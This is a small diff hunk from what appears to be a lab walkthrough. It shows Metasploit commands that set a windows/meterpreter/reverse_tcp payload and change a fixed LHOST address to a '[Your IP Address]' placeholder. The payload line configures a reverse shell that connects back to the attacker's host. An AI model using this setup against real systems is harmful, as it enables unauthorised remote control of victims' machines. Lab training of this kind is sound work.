@@ -89,7 +89,7 @@ Now run all of the following commands to set the correct parameters:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-<pre>set LHOST 10.10.81.56</pre>
+<pre>set LHOST [Your IP Address]</pre>
 
 **REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
